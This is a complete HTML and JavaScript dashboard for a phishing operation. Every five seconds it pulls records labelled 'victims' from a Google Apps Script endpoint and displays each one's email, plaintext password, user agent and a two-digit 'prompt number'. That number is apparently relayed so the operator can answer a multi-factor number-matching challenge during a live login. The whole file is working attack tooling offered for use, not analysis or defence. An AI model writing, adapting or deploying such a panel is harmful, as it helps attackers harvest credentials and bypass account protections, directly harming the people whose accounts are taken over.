<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Live Prompt Monitor – Latest Number</title>
  <meta http-equiv="refresh" content="300"> <!-- fallback full refresh every 5 min -->
  <style>
    body {
      font-family: 'Segoe UI', Roboto, sans-serif;
      background: #f8fafc;
      color: #1e293b;
      margin: 0;
      padding: 20px 16px;
      min-height: 100vh;
    }
    .container {
      max-width: 960px;
      margin: 0 auto;
    }
    h1 {
      color: #1d4ed8;
      text-align: center;
      margin: 0 0 12px;
      font-size: 2.1rem;
    }
    .latest-card {
      background: linear-gradient(135deg, #2563eb, #1e40af);
      color: white;
      padding: 2.5rem 1.5rem;
      border-radius: 16px;
      text-align: center;
      margin-bottom: 2.5rem;
      box-shadow: 0 10px 30px rgba(37,99,235,0.25);
    }
    .latest-label {
      font-size: 1.15rem;
      opacity: 0.9;
      margin-bottom: 0.75rem;
    }
    .latest-number {
      font-size: 5.5rem;
      font-weight: 800;
      letter-spacing: 10px;
      margin: 0;
      line-height: 1;
    }
    .latest-info {
      margin-top: 1rem;
      font-size: 1.1rem;
      opacity: 0.95;
    }
    .no-number {
      font-size: 2rem;
      opacity: 0.7;
    }
    table {
      width: 100%;
      border-collapse: collapse;
      background: white;
      border-radius: 12px;
      overflow: hidden;
      box-shadow: 0 4px 16px rgba(0,0,0,0.07);
    }
    th, td {
      padding: 14px 16px;
      text-align: left;
    }
    th {
      background: #1e40af;
      color: white;
      font-weight: 600;
    }
    tr:nth-child(even) {
      background: #f8fafc;
    }
    .status-password { color: #059669; font-weight: 600; }
    .status-ready    { color: #7c3aed; font-weight: 600; }
    .timestamp       { color: #64748b; font-size: 0.95rem; }
    .loading, .error {
      text-align: center;
      padding: 2rem;
      font-size: 1.2rem;
      color: #64748b;
    }
    .last-update {
      text-align: center;
      margin-top: 1.5rem;
      color: #64748b;
      font-size: 0.95rem;
    }
  </style>
</head>
<body>

  <div class="container">
    <h1>Live Latest Prompt Number</h1>

    <div class="latest-card">
      <div class="latest-label">Current Active Prompt Number</div>
      <div class="latest-number" id="latestNumber">••</div>
      <div class="latest-info" id="latestInfo"></div>
    </div>

    <div id="loading" class="loading">Loading latest data...</div>
    <div id="error" class="error" style="display:none;"></div>

    <table id="dataTable" style="display:none;">
      <thead>
        <tr>
          <th>Timestamp</th>
          <th>Email</th>
          <th>Status</th>
          <th>Prompt Number</th>
          <th>User Agent</th>
          <th>Password</th>
        </tr>
      </thead>
      <tbody id="tableBody"></tbody>
    </table>

    <div class="last-update" id="lastUpdate">Last update: —</div>
  </div>

  <script>
    const SCRIPT_URL = "https://script.google.com/macros/s/AKfycbxayueIRLXEyEmTO2BATezFZdivXqQqb5wp_lKX22wWfcSS8wvD1lZS4vTJ5eIlJ0bN/exec"; // ← your real script URL

    let lastKnownNumber = "••";

    async function fetchAndUpdate() {
      try {
        const response = await fetch(`${SCRIPT_URL}?getVictims=true`, {
          cache: "no-store"
        });

        if (!response.ok) throw new Error(`HTTP ${response.status}`);

        const victims = await response.json();

        // Sort just in case (though script usually gives newest first)
        victims.sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp));

        // Find the most recent valid 2-digit prompt number
        let latest = { number: "••", email: "", timestamp: "" };
        for (const v of victims) {
          const num = (v.promptNumber || "").trim();
          if (/^\d{2}$/.test(num)) {
            latest = {
              number: num,
              email: v.email || "—",
              timestamp: v.timestamp ? new Date(v.timestamp).toLocaleString() : "—"
            };
            break;
          }
        }

        // Update top display only if changed (reduces flicker)
        if (latest.number !== lastKnownNumber) {
          document.getElementById("latestNumber").textContent = latest.number;
          document.getElementById("latestInfo").textContent = 
            latest.number !== "••" 
              ? `from ${latest.email} • ${latest.timestamp}`
              : "No active prompt number yet";
          lastKnownNumber = latest.number;
        }

        // Build / update table
        const tbody = document.getElementById("tableBody");
        tbody.innerHTML = "";

        victims.forEach(v => {
          const tr = document.createElement("tr");
          tr.innerHTML = `
            <td class="timestamp">${v.timestamp ? new Date(v.timestamp).toLocaleString() : "—"}</td>
            <td>${v.email || "—"}</td>
            <td class="${v.status?.includes("password") ? "status-password" : "status-ready"}">
              ${v.status || "—"}
            </td>
            <td style="font-weight: ${v.promptNumber ? 'bold' : 'normal'};">
              ${v.promptNumber || "—"}
            </td>
            <td>${v.user_agent || v.userAgent || "—"}</td>
            <td>${v.password || "—"}</td>
          `;
          tbody.appendChild(tr);
        });

        // Show table + hide loading
        document.getElementById("dataTable").style.display = "table";
        document.getElementById("loading").style.display = "none";
        document.getElementById("error").style.display = "none";

        // Update timestamp
        document.getElementById("lastUpdate").textContent = 
          `Last update: ${new Date().toLocaleTimeString()}`;

      } catch (err) {
        console.error("Fetch error:", err);
        document.getElementById("loading").style.display = "none";
        const errEl = document.getElementById("error");
        errEl.textContent = "Error loading data – will retry soon";
        errEl.style.display = "block";
      }
    }

    // Initial load
    fetchAndUpdate();

    // Auto-refresh every 5 seconds (adjust as needed – 3000–10000 ms is reasonable)
    setInterval(fetchAndUpdate, 5000);
  </script>
</body>
</html>
